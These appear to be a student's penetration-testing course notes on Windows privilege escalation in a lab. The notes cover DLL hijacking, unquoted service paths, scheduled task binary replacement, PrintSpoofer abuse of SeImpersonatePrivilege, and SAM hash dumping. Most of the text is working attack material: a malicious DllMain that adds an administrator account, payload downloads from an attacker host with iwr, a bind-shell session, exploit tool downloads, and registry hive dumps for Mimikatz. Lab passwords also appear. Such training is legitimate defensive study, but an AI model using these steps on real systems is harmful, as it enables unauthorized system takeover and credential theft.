+ Once we enter the password _admin123admin123!_ for _backupadmin_ and accept the terms, the program starts
![[Pasted image 20231128143340.png]]

Without any filters, the information provided by Process Monitor can be quite overwhelming
+ Multiple new list entries are added every second
+ For now, we are only interested in events related to the process _BetaServ_ of the target service, so we can create a filter to only include events related to it 
+ For this, we'll click on the _Filter_ menu > _Filter..._ to get into the filter configuration

The filter consists of four conditions
+ Our goal is that Process Monitor only shows events related to the _BetaServ_ Process
+ We enter the following arguments: _Process Name_ as _Column_, _is_ as _Relation_, _BetaServ.exe_ as _Value_, and _Include_ as _Action_. Once entered, we'll click on _Add_
![[Pasted image 20231128143743.png]]

After applying the filter, the list is empty. 
+ In order to analyze the service binary, we should try restarting the service as the binary will then attempt to load the 
+ In PowerShell, we enter **Restart-Service** with **BetaService** as argument, while Process Monitor is running in the background:
```
PS C:\Users\steve> Restart-Service BetaService
WARNING: Waiting for service 'BetaService (BetaService)' to start...
```
+ Above shows that we could successfully restart _BetaService_

Checking Process Monitor, we notice that numerous events appeared
+ Scrolling down in the list, various _CreateFile_ calls can be found in the _Operation_ column
+ The _CreateFile_ function can be used to create or open a file:
![[Pasted image 20231128143937.png]]

Above shows that the _CreateFile_ calls attempted to open a file named **myDLL.dll** in several paths
+ The _Detail_ column states _NAME NOT FOUND_ for these calls, which means that a DLL with this name couldn't be found in any of these paths

The consecutive function calls follow the DLL search order from the standard search order, starting with the directory the application is located in and ending with the directories in the _PATH_ environment variable
+ We can confirm this by displaying the contents of this environment variable with **$env:path** in PowerShell
```
PS C:\Users\steve> $env:path
C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\steve\AppData\Local\Microsoft\WindowsApps;
```
+ The directories in the PATH environment variable match the paths used in the _CreateFile_ calls recorded by Process Monitor

So far, we know that the service binary tries to locate a file called **myDLL.dll**, but fails to do so
+ To abuse this, we can attempt to write a DLL file with this name to a path used by the DLL search order
+ The first call attempts to locate the DLL in the **Documents** folder of _steve_
+ Because it's a home directory of _steve_, we have permissions to write to this folder and can place a malicious DLL there then restart the service to load it 

Before we create a DLL, let's briefly review how attaching a DLL works and how it may lead us to code execution
+ Each DLL can have an optional _entry point function_ named _DllMain_, which is executed when processes or threads attach the DLL
+ This function generally contains four cases named _DLL_PROCESS_ATTACH_, _DLL_THREAD_ATTACH_, _DLL_THREAD_DETACH_, _DLL_PROCESS_DETACH_
+ These cases handle situations when the DLL is loaded or unloaded by a process or thread
+ They are commonly used to perform initialization tasks for the DLL or tasks related to exiting the DLL
+ If a DLL doesn't have a _DllMain_ entry point function, it only provides resources

The following listing shows us a code example from Microsoft, outlining a basic DLL in _C++_ containing these four cases
+ The DLL code contains the entry point function _DllMain_ and the previously mentioned cases in a _switch_ statement
+ Depending on the value of _ul_reason_for_call_ one of these cases gets executed
+ As of now, all cases only use a _break_ statement:
``` c++
BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

The provided comments from Microsoft state that _DLL_PROCESS_ATTACH_ is used when a process is loading the DLL
+ Since the target service binary process in our example tries to load the DLL, this is the case we need to add our code to

Let's reuse the C code from the previous section by adding the _include_ statement as well as the system function calls to the C++ DLL code
+ Additionally, we need to use an _include_ statement for the header file **windows.h**, since we use Windows specific data types such as _BOOL_
+ The final code is shown in the following listing
``` c++
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave2 password123! /add");
  	    i = system ("net localgroup administrators dave2 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

Now, let's cross-compile the code with _mingw_
+ We use the same command as in the previous section but change the input code file, the output name, and add **--shared** to specify that we want to build a DLL:
```
x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
```

Once the DLL is compiled, we can transfer it to CLIENTWK220
+ We can start a Python3 web server on Kali in the directory the DLL is located in and use **iwr** in a PowerShell window on the target machine
+ Before we download the file, we change our current directory to the **Documents** folder of _steve_ to download it into the correct directory for our attack
+ Additionally, we confirm that _dave2_ doesn't exist yet on the system with the **net user** command
```
PS C:\Users\steve> cd Documents

PS C:\Users\steve\Documents> iwr -uri http://192.168.119.3/myDLL.dll -Outfile myDLL.dll

PS C:\Users\steve\Documents> net user
User accounts for \\CLIENTWK220

-------------------------------------------------------------------------------
Administrator            BackupAdmin              dave
daveadmin                DefaultAccount           Guest
offsec                   steve                    WDAGUtilityAccount
The command completed successfully.
```

**myDLL.dll** is now located in the **Documents** folder of _steve_, which is the first path in the DLL search order
+ After we restart _BetaService_, our DLL should be loaded into the process and the code to create the user _dave2_ as member of the local _Administrators_ group in _DLL_PROCESS_ATTACH_ should be executed
```
PS C:\Users\steve\Documents> Restart-Service BetaService
WARNING: Waiting for service 'BetaService (BetaService)' to start...
WARNING: Waiting for service 'BetaService (BetaService)' to start...

PS C:\Users\steve\Documents> net user
User accounts for \\CLIENTWK220

-------------------------------------------------------------------------------
Administrator            BackupAdmin              dave
dave2                    daveadmin                DefaultAccount
Guest                    offsec                   steve
WDAGUtilityAccount
The command completed successfully.

PS C:\Users\steve\Documents> net localgroup administrators
...
Administrator
BackupAdmin
dave2
daveadmin
offsec
The command completed successfully.
```
+ Above shows that _dave2_ was created and added to the local _Administrators_ group, once the service is restarted. Excellent!

### Unquoted Service Paths
Another interesting attack vector that can lead to privilege escalation on Windows operating systems revolves around _unquoted service paths_
+ We can use this attack when we have Write permissions to a service's main directory or subdirectories but cannot replace files within them

As we learned in the previous sections, each Windows service maps to an executable file that will be run when the service is started
+ If the path of this file contains one or more spaces and is not enclosed within quotes, it may be turned into an opportunity for a privilege escalation attack

When a service is started and a process is created, the Windows _CreateProcess_ function is used
+ Reviewing the first parameter of the function, _lpApplicationName_ is used to specify the name and optionally the path to the executable file
+ If the provided string contains spaces and is not enclosed within quotation marks, it can be interpreted in various ways because it is unclear to the function where the file name ends and the arguments begin
+ To determine this, the function starts interpreting the path from left to right until a space is reached
+ For every space in the file path, the function uses the preceding part as file name by adding **.exe** and the rest as arguments

Let's show this in an example with the unquoted service binary path `C:\Program Files\My Program\My Service\service.exe`
+ When Windows starts the service, it will use the following order to try to start the executable file due to the spaces in the path:
```
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe
```
+ Listing 66 shows the order Windows tries to interpret the service binary path to locate the executable file

In order to exploit this and subvert the original unquoted service call, we must create a malicious executable, place it in a directory that corresponds to one of the interpreted paths, and match its name to the interpreted filename
+ Then, once the service is started, our file gets executed with the same privileges that the service starts with
+ Often, this happens to be the _LocalSystem_ account, which results in a successful privilege escalation attack

In the context of the example, we could name our executable **`Program.exe`** and place it in **`C:\`**, **`My.exe`** and place it in **`C:\Program Files\`**, or **`My.exe`** and place it in **`C:\Program Files\My Program\`** 
+ However, the first two options would require some unlikely permissions since standard users don't have the permissions to write to these directories by default
+ The third option is more likely as it is the software's main directory
+ If an administrative user or developer set the permissions for this directory too open, we can place our malicious binary there

Now that we have a basic understanding of this vulnerability, let's use it in an example
+ We connect to CLIENTWK220 as _`steve`_ (password _`securityIsNotAnOption++++++`_) with RDP
+ We open PowerShell and enumerate running and stopped services
``` PowerShell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
```
+ Example output:
```
Name                      State   PathName
----                      -----   --------
...
GammaService                             Stopped C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
...
```
+ Above shows a stopped service named _GammaService_
+ The unquoted service binary path contains multiple spaces and is therefore potentially vulnerable to this attack vector

A more effective way to identify spaces in the paths and missing quotes is using the _WMI command-line_ (WMIC) utility
+ We can enter **service** to obtain service information and the verb **get** with **name** and **pathname** as arguments to retrieve only these specific property values
+ We'll pipe the output of this command to **findstr** with **/i** for case-insensitive searching and **/v** to only print lines that don't match
+ As the argument for this command, we'll enter **"C:\Windows\"** to show only services with a binary path outside of the Windows directory
+ We'll pipe the output of this command to another **findstr** command, which uses **`"""`** as argument to print only matches without quotes

Let's enter this command in **cmd.exe** instead of PowerShell to avoid escaping issues for the quote in the second _findstr_ command. Alternatively, we could use _Select-String_ in PowerShell
``` PowerShell
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```
+ Example output:
```
Name                                       PathName                                                                     
...                                                                                                         
GammaService                               C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```
+ The output of this command only lists services that are potentially vulnerable to our attack vector, such as GammaService

Before we go on, let's check if we can start and stop the identified service as _steve_ with **`Start-Service`** and **`Stop-Service`**:
```
PS C:\Users\steve> Start-Service GammaService
WARNING: Waiting for service 'GammaService (GammaService)' to start...

PS C:\Users\steve> Stop-Service GammaService
```
+ Above indicates that _steve_ has permissions to start and stop GammaService

Since we can restart the service ourselves, we don't need to issue a reboot to restart the service
+ Next, let's list the paths Windows uses to attempt locating the executable file of the service:
```
C:\Program.exe
C:\Program Files\Enterprise.exe
C:\Program Files\Enterprise Apps\Current.exe
C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```

Let's check our access rights in these paths with **`icacls`**. We'll begin with the first two paths:
```
PS C:\Users\steve> icacls "C:\"
C:\ BUILTIN\Administrators:(OI)(CI)(F)
    NT AUTHORITY\SYSTEM:(OI)(CI)(F)
    BUILTIN\Users:(OI)(CI)(RX)
    NT AUTHORITY\Authenticated Users:(OI)(CI)(IO)(M)
    NT AUTHORITY\Authenticated Users:(AD)
    Mandatory Label\High Mandatory Level:(OI)(NP)(IO)(NW)
    
Successfully processed 1 files; Failed processing 0 files
    
PS C:\Users\steve>icacls "C:\Program Files"
C:\Program Files NT SERVICE\TrustedInstaller:(F)
                 NT SERVICE\TrustedInstaller:(CI)(IO)(F)
                 NT AUTHORITY\SYSTEM:(M)
                 NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
                 BUILTIN\Administrators:(M)
                 BUILTIN\Administrators:(OI)(CI)(IO)(F)
                 BUILTIN\Users:(RX)
                 BUILTIN\Users:(OI)(CI)(IO)(GR,GE)
                 CREATOR OWNER:(OI)(CI)(IO)(F)
...

Successfully processed 1 files; Failed processing 0 files
```
+ As expected, our user _steve_, as a member of _BUILTIN\Users_ and _NT AUTHORITY\AUTHENTICATED Users_, has no Write permissions in either of these paths

Now, let's check the path of the third option. We can skip the fourth path since it represents the service binary itself:
```
PS C:\Users\steve> icacls "C:\Program Files\Enterprise Apps"
C:\Program Files\Enterprise Apps NT SERVICE\TrustedInstaller:(CI)(F)
                                 NT AUTHORITY\SYSTEM:(OI)(CI)(F)
                                 BUILTIN\Administrators:(OI)(CI)(F)
                                 BUILTIN\Users:(OI)(CI)(RX,W)
                                 CREATOR OWNER:(OI)(CI)(IO)(F)
                                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(RX)
                                 APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(RX)

Successfully processed 1 files; Failed processing 0 files
```
+ Above shows that _`BUILTIN\Users`_ has Write (w) permissions on the path **`C:\Program Files\Enterprise Apps`**. Our goal is now to place a malicious file named **`Current.exe`** in **`C:\Program Files\Enterprise Apps\`**

We can reuse the **adduser.exe** binary by compiling the C code from the section "Service Binary Hijacking".
+ On Kali, we start a Python3 web server in the directory of the executable file in order to serve it 

Once the web server is running, we can download **adduser.exe** on the target machine as _steve_
+ To save the file with the correct name for our privilege escalation attack, we enter **`Current.exe`** as argument for **`-Outfile`**
+ After the file is downloaded, we copy it to **`C:\Program Files\Enterprise Apps\`**.
```
PS C:\Users\steve> iwr -uri http://192.168.119.3/adduser.exe -Outfile Current.exe

PS C:\Users\steve> copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
```

Now, everything is ready for us to start the service, which should execute **Current.exe** instead of the original service binary **GammaServ.exe**
+ For this, we use `Start-Service` with **GammaService** as argument
+ We can use `net user` to check if _dave2_ was created and `net localgroup administrators` to confirm that _dave2_ was added to the local _Administrators_ group
```
PS C:\Users\steve> Start-Service GammaService
Start-Service : Service 'GammaService (GammaService)' cannot be started due to the following error: Cannot start
service GammaService on computer '.'.
At line:1 char:1
+ Start-Service GammaService
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : OpenError: (System.ServiceProcess.ServiceController:ServiceController) [Start-Service],
   ServiceCommandException
    + FullyQualifiedErrorId : CouldNotStartService,Microsoft.PowerShell.Commands.StartServiceCommand
    
PS C:\Users\steve> net user

Administrator            BackupAdmin              dave
dave2                    daveadmin                DefaultAccount
Guest                    offsec                   steve
WDAGUtilityAccount
The command completed successfully.

PS C:\Users\steve> net localgroup administrators
...
Members

-------------------------------------------------------------------------------
Administrator
BackupAdmin
dave2
daveadmin
offsec
The command completed successfully.
```
+ Above shows that the Start-Service command displayed an error that Windows cannot start the service
+ The error stems from the fact that our cross-compiled C code does not accept the parameters that are a leftover of the original service binary path
+ However, `Current.exe` was still executed and _dave2_ was created as a member of the local _Administrators_ group

To restore the functionality of the original service, we have to stop the service and delete our binary **Current.exe**
+ After the executable file is removed, Windows will use the service binary **GammaServ.exe** again once the service is started

Before we conclude this section, let's check if PowerUp identifies this vulnerability
+ For this, we download PowerUp with **iwr** and import it into a PowerShell session as we did previously:
```
iwr http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1
```
+ Then we set the _ExecutionPolicy_ to _Bypass_ and use **`Get-UnquotedService`**
``` Powershell
powershell -ep bypass
. .\PowerUp.ps1
Get-UnquotedService
```
+ Example output:
```
ServiceName    : GammaService
Path           : C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users;
                 Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'GammaService' -Path <HijackPath>
CanRestart     : True

ServiceName    : GammaService
Path           : C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'GammaService' -Path <HijackPath>
CanRestart     : True
```
+ Above shows that the GammaService was identified as vulnerable
+ Let's use the `AbuseFunction` and restart the service to attempt to elevate our privileges
+ For **-Path**, we enter the same path for **Current.exe** as we did before
+ As stated before, the default behavior is to create a new local user called _john_ with the password _Password123!_
+ Additionally, the user is added to the local _Administrators_ group
```
Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"

Restart-Service GammaService
```
+ Example output:
```
PS C:\Users\steve> net user

User accounts for \\CLIENTWK220

-------------------------------------------------------------------------------
Administrator            BackupAdmin              dave
dave2                    daveadmin                DefaultAccount
Guest                    john            offsec
steve                    WDAGUtilityAccount

The command completed successfully.

PS C:\Users\steve> net localgroup administrators
...
john
...
```
+ Above shows that by using the AbuseFunction, _Write-ServiceBinary_, the user _john_ was created as a local administrator

## Abusing Other Windows Components
We used privilege escalation vectors related to Windows services
+ This is not the only Windows component we can abuse to elevate our privileges
+ Will explore _Scheduled Tasks_ and exploits targeting Windows itself to perform privilege escalation attacks
### Scheduled Tasks
Windows uses the _Task Scheduler_ to execute various automated tasks, such as clean-up activities or update management
+ On Windows, they are called Scheduled Tasks, or _Tasks_, and are defined with one or more triggers
+ A trigger is used as a condition, causing one or more actions to be executed when met
+ For example, a trigger can be set to a specific time and date, at startup, at log on, or on a Windows _event_
+ An action specifies which program or script to execute
+ There are various other possible configurations for a task, categorized in the _Conditions_, _Settings_, and _General_ menu tabs of a task's property

For us, three pieces of information are vital to obtain from a scheduled task to identify possible privilege escalation vectors:
1. As which user account (principal) does this task get executed?
2. What triggers are specified for the task?
3. What actions are executed when one or more of these triggers are met?

The first question helps us understand if abusing the task will eventually lead to privilege escalation
+ If the task is executed in the context of our current user, it won't lead us to elevated privileges
+ However, if the task runs as _NT AUTHORITY\SYSTEM_ or as an administrative user, then a successful attack could lead us to privilege escalation

The second question is important because if the trigger condition was met in the past, the task will not run again in the future and therefore, is not a viable target for us
+ Additionally, if we are in a week-long penetration test, but the task runs after this time, we should search for another privilege escalation vector
+ However, we would mention this finding in a penetration testing report for a client

While the first two questions help us understand if this task is even an option for a privilege escalation attack, the answer to the third question determines how we can perform the potential privilege escalation
+ In the majority of cases, we can leverage familiar tactics such as replacing the binary or placing a missing DLL as we did with services in a previous Learning Unit
+ While we don't have a service binary with scheduled tasks, we have programs and scripts specified by actions

Let's walk through an example in which we attempt to elevate our privileges by replacing a binary specified in an action
+ For this, we'll connect once again as _`steve`_ (password _`securityIsNotAnOption++++++`_) to `CLIENTWK220` with RDP and start a PowerShell window

We can view scheduled tasks on Windows with the _Get-ScheduledTask_ Cmdlet or the command `schtasks /query`
+ We'll use the latter for this example to review all scheduled tasks on `CLIENTWK220`
+ We enter **`/fo`** with **`LIST`** as argument to specify the output format as list
+ Additionally, we add **`/v`** to display all properties of a task

Once the command is executed, we get a huge amount of output with information about all scheduled tasks on the system
+ We should seek interesting information in the _Author_, _TaskName_, _Task To Run_, _Run As User_, and _Next Run Time_ fields
+ In our case, "interesting" means that the information partially or completely answers one of the three questions above
+ Usage:
``` PowerShell
schtasks /query /fo LIST /v
```
+ Example Output:
```
...
Folder: \Microsoft
HostName:                             CLIENTWK220
TaskName:                             \Microsoft\CacheCleanup
Next Run Time:                        7/11/2022 2:47:21 AM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/11/2022 2:46:22 AM
Last Result:                          0
Author:                               CLIENTWK220\daveadmin
Task To Run:                          C:\Users\steve\Pictures\BackendCacheCleanup.exe
Start In:                             C:\Users\steve\Pictures
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode
Run As User:                          daveadmin
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: Disabled
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        One Time Only, Minute
Start Time:                           7:37:21 AM
Start Date:                           7/4/2022
...
```
+ Above shows information about a task named _\Microsoft\CacheCleanup_

Interestingly, the task was created by _daveadmin_ and the specified action is to execute **`BackendCacheCleanup.exe`** in the **Pictures** home directory of _steve_
 + In addition, the times from _Last Run Time_ and _Next Run Time_ indicate that the task is executed every minute
 + The task runs as user _daveadmin_

Since the executable file **BackendCacheCleanup.exe** is located in a subdirectory of the home directory of _steve_, we should have extensive permissions on it 
+ Let's check our permissions on this file with **icacls** 
```
PS C:\Users\steve> icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
C:\Users\steve\Pictures\BackendCacheCleanup.exe NT AUTHORITY\SYSTEM:(I)(F)
                                                BUILTIN\Administrators:(I)(F)
                                                CLIENTWK220\steve:(I)(F)
                                                CLIENTWK220\offsec:(I)(F)
```
+ As expected, we have Full Access (F) permissions, since the executable file is in the home directory of _steve_. 
+ Now, we can use our binary **adduser.exe** again to replace the executable file specified in the action of the scheduled task

To do so, we'll start a Python3 web server to serve our cross-compiled file, **adduser.exe**, and use **iwr** to download it to CLIENTWK220
+ We'll also copy the original **BackendCacheCleanup.exe** so we can restore it after our privilege escalation attack is successful
```
PS C:\Users\steve> iwr -Uri http://192.168.119.3/adduser.exe -Outfile BackendCacheCleanup.exe

PS C:\Users\steve> move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak

PS C:\Users\steve> move .\BackendCacheCleanup.exe .\Pictures\
```
+ Once the scheduled task is executed again, _dave2_ should be created and added to the local _Administrators_ group
+ After waiting a minute, we can check if our privilege escalation attack was successful:
```
PS C:\Users\steve> net user

User accounts for \\CLIENTWK220

-------------------------------------------------------------------------------
Administrator            BackupAdmin              dave
dave2                    daveadmin                DefaultAccount
Guest                    offsec                   steve
WDAGUtilityAccount
The command completed successfully.

PS C:\Users\steve> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
BackupAdmin
dave2
daveadmin
offsec
The command completed successfully.
```
+ Above shows that we successfully replaced the executable file used by the scheduled task to create an administrative user whose credentials we control

### Using Exploit 
In the previous sections, we attempted to elevate our privileges by searching for sensitive information on a system or abusing Windows components such as Windows services or scheduled tasks
+ In this section, we'll discuss three different kinds of exploits leading to privilege escalation and then show one of them in an example

#### Application-Based Vulnerabilities
The first kind is to exploit _application-based_ vulnerabilities
+ Installed applications on a Windows system may contain different types of vulnerabilities as we learned in the Module "Locating Public Exploits"
+ If these applications run with administrative permissions and we can exploit a vulnerability that leads to code execution, we can also successfully elevate our privileges

#### Windows Kernel Vulnerabilities
The second kind is to exploit vulnerabilities in the _Windows Kernel_
+ However, the vulnerability research and related exploit techniques are, in most cases, quite advanced and require an in-depth understanding of the Windows operating system
+ For the purposes of this Module, it is enough to understand that Windows kernel exploits exist and can be used for privilege escalation

Before we blindly download and use a kernel exploit, we need to consider that these types of exploits can easily crash a system
+ Depending on the rules of engagement of a penetration test, we may not be allowed to use methods that will potentially disrupt services or systems
+ Therefore, we should always have a clear understanding of our limitations, exclusions, and boundaries in a real-life assessment
+ These words of caution should not lead us to abstain from all kernel exploits, but provide us with the correct mindset when working with them

#### Windows Privileges Abuse
The last kind is to abuse certain Windows privileges
+ Non-privileged users with assigned privileges, such as _SeImpersonatePrivilege_, can potentially abuse those privileges to perform privilege escalation attacks
+ _SeImpersonatePrivilege_ offers the possibility to leverage a token with another security context
+ Meaning, a user with this privilege can perform operations in the security context of another user account under the right circumstances
+ By default, Windows assigns this privilege to members of the local _Administrators_ group as well as the device's _LOCAL SERVICE_, _NETWORK SERVICE_, and _SERVICE_ accounts
+ Microsoft implemented this privilege to prevent unauthorized users from creating a service or server application to impersonating clients connecting to it 
+ An example would be _Remote Procedure Calls_ (RPC) or _named pipes_
	+ **NOTE**: Other privileges that may lead to privilege escalation are _SeBackupPrivilege_, _SeAssignPrimaryToken_, _SeLoadDriver_, and _SeDebug_. In this section, we'll closely inspect privilege escalation vectors in the context of _SeImpersonatePrivilege_

In penetration tests, we'll rarely find standard users with this privilege assigned
+ However, we'll commonly come across this privilege when we obtain code execution on a Windows system by exploiting a vulnerability in an _Internet Information Service_ (IIS) web server
+ In most configurations, IIS will run as _LocalService_, _LocalSystem_, _NetworkService_, or _ApplicationPoolIdentity_
+ which all have _SeImpersonatePrivilege_ assigned and also applies to other windows services

##### Names Pipes 
Before we head into the example, let's discuss named pipes and how we can use them in the context of _SeImpersonatePrivilege_ to impersonate a privileged user account
+ Named pipes are one method for local or remote _Inter-Process Communication_ in Windows
+ They offer the functionality of two unrelated processes sharing and transferring data with each other
+ A named pipe server can create a named pipe to which a named pipe client can connect via the specified name
+ The server and client don't need to reside on the same system

Once a client connects to a named pipe, the server can leverage _SeImpersonatePrivilege_ to impersonate this client after capturing the authentication from the connection process
+ To abuse this, we need to find a privileged process and coerce it into connecting to a controlled named pipe
+ With _SeImpersonatePrivilege_ assigned, we can then impersonate the user account connecting to the named pipe and perform operations in its security context

For this example, we'll use a tool named _PrintSpoofer_ created by _itm4n_, which implements a variation of the _printer bug_ to coerce _NT AUTHORITY\SYSTEM_ into connecting to a controlled named pipe
+ We can use this tool in situations where we have code execution as a user with the privilege _SeImpersonatePrivilege_ to execute commands or obtain an interactive shell as _NT AUTHORITY\SYSTEM_

##### Named Pipe Attack
Now, let's begin by connecting to the bind shell on port 4444 on CLIENTWK220 as we did in the previous sections
+ We use **`whoami /priv`** to display the assigned privileges of _dave_
```
kali@kali:~$ nc 192.168.50.220 4444
Microsoft Windows [Version 10.0.22000.318]
(c) Microsoft Corporation. All rights reserved.

C:\Users\dave> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeSecurityPrivilege           Manage auditing and security log          Disabled
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```
+ Above shows that _dave_ has the privilege _SeImpersonatePrivilege_ assigned
+ Therefore, we can attempt to elevate our privileges by using _PrintSpoofer_. Let's open another terminal tab on Kali, download the 64-bit version of this tool, and serve it with a Python3 web server
+ Get the exploit with:
```
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
```
+ Serve the exploit with:
```
python3 -m http.server 80
```

In the terminal tab with the active bind shell, we'll start a PowerShell session and use **iwr** to download **PrintSpoofer64.exe** from our Kali machine
```
C:\Users\dave> powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\dave> iwr -uri http://192.168.119.2/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
iwr -uri http://192.168.119.2/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
```
+ To obtain an interactive PowerShell session in the context of _NT AUTHORITY\SYSTEM_ with _PrintSpoofer64.exe_, we'll enter **powershell.exe** as argument for **-c** to specify the command we want to execute and **-i** to interact with the process in the current command prompt, usage:
```
.\PrintSpoofer64.exe -i -c powershell.exe
```
+ Example usage and output:
```
PS C:\Users\dave> .\PrintSpoofer64.exe -i -c powershell.exe
.\PrintSpoofer64.exe -i -c powershell.exe
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> whoami
whoami
nt authority\system
```
+ Above shows that we successfully performed the privilege escalation attack using _PrintSpoofer_, leading us to an interactive PowerShell session in the context of the user account _NT AUTHORITY\SYSTEM_

While PrintSpoofer provided us a straightforward exploit process to elevate our privileges, there are also other tools that can abuse _SeImpersonatePrivilege_ for privilege escalation
+ Variants from the _Potato_ family (for example _RottenPotato_, _SweetPotato_, or _JuicyPotato_) are such tools:
```
wget https://raw.githubusercontent.com/uknowsec/SweetPotato/master/SweetPotato-Webshell-new/bin/Release/SweetPotato.exe
```
+ We should take the time to study these tools as they are an effective alternative to PrintSpoofer

### Hash extraction with SeImpersonatePrivilege

_Mimikatz_ with only the *SeImpersonatePrivilege* token can extract hashes after first dumping the sam and system files
+ Will dump the sam and system file with the following commands
```
reg save hklm\sam .\sam
reg save hklm\system .\system
```
+ *Mimikatz* command with those dumped files to get hashes:
```
lsadump::sam /system:.\system /sam:.\sam
```

